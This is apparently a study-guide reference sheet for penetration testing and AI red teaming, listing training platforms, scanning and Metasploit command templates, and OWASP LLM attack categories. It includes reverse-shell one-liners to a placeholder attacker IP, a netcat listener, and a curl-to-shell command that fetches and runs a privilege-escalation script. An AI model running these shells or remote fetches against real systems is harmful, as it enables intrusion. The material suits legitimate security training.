# Resources and Reference

Quick reference for tools, commands, and links used throughout the learning journey.

---

## Core Platforms

| Platform | URL | Cost | Phase |
|---|---|---|---|
| PortSwigger Web Academy | portswigger.net/web-security | FREE | All |
| OWASP LLM Top 10 | owasp.org/www-project-top-10-for-large-language-model-applications | FREE | All |
| MITRE ATLAS | atlas.mitre.org | FREE | All |
| PyRIT | github.com/Azure/PyRIT | FREE | Phase 1+ |
| Garak | github.com/leondz/garak | FREE | Phase 1+ |
| TryHackMe | tryhackme.com | $14/mo | Phase 1 |
| HackTheBox | hackthebox.com | $14/mo VIP | Phase 2+ |
| INE / eJPT | ine.com | $299/yr | Phase 2 |
| TCM Security | tcm-sec.com | $30-60/course | Phase 1-3 |
| OSCP | offsec.com/courses/pen-200 | ~$1,499 | Phase 4 |

---

## YouTube — Free Learning

| Channel | Focus |
|---|---|
| IppSec — youtube.com/@ippsec | HTB machine walkthroughs — watch AFTER attempting |
| The Cyber Mentor — youtube.com/@TCMSecurityAcademy | Full courses, methodology |
| John Hammond — youtube.com/@_JohnHammond | CTF and pentesting methodology |

---

## Essential Tool Commands

### Nmap

```bash
# Basic scan
nmap -sV -sC [IP]

# Full port scan
nmap -p- [IP]

# Aggressive scan with output
nmap -A -oN scan.txt [IP]

# UDP scan
nmap -sU [IP]
```

### Gobuster — Web Directory Busting

```bash
gobuster dir -u http://[IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Metasploit

```bash
msfconsole
search [exploit name]
use [module]
show options
set RHOSTS [IP]
run
```

### Burp Suite
- Proxy → Intercept → capture and modify requests
- Repeater → manually resend and modify requests
- Intruder → automated parameter fuzzing
- Scanner → automated vulnerability scanning (Pro)

### LinPEAS / WinPEAS — Privilege Escalation Enumeration

```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

## Wordlists

```
/usr/share/wordlists/rockyou.txt          # Password cracking
/usr/share/wordlists/dirbuster/           # Directory busting
/usr/share/seclists/                      # SecLists — comprehensive
```

---

## Reverse Shell Reference

```bash
# Bash
bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat listener
nc -lvnp [PORT]
```

---

## AI Red Team Reference

### OWASP LLM Top 10 Quick Reference

| ID | Category | Core Attack |
|---|---|---|
| LLM01 | Prompt Injection | Manipulate model behavior through crafted inputs |
| LLM02 | Insecure Output Handling | Model output processed unsafely downstream |
| LLM03 | Training Data Poisoning | Corrupt model behavior at training stage |
| LLM04 | Model Denial of Service | Resource exhaustion through adversarial inputs |
| LLM05 | Supply Chain Vulnerabilities | Compromised components in AI pipeline |
| LLM06 | Sensitive Info Disclosure | Model reveals training data or system prompts |
| LLM07 | Insecure Plugin Design | Plugin integrations exploited via model |
| LLM08 | Excessive Agency | Over-privileged AI agent takes harmful actions |
| LLM09 | Overreliance | System or user trusts model output without validation |
| LLM10 | Model Theft | Model weights or functionality extracted |

### PyRIT Quick Start

```bash
# Install
pip install pyrit

# Basic usage — see github.com/Azure/PyRIT for full documentation
```

### Garak Quick Start

```bash
# Install
pip install garak

# Basic scan
garak --model_type openai --model_name gpt-3.5-turbo --probes all
```

---

## TJ Null OSCP Machine List

Google: **"TJ Null OSCP HTB list"** — maintained spreadsheet of HTB machines relevant to OSCP preparation. Work through this list systematically from Phase 2 onward.

---

*Last updated: June 2026*
